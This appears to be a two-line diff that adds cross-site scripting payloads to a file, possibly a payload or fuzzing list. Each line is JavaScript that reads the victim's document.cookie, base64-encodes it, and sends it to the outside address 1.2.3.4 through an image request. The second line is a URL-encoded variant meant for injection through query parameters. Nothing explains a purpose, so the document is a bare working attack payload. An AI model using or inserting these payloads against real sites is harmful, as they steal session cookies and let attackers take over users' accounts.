@@ -1,0 +1,2 @@
+;new Image().src='http://1.2.3.4/cookie='+btoa(document.cookie);
+;new Image().src='http://1.2.3.4/cookie='%2bbtoa(document.cookie);
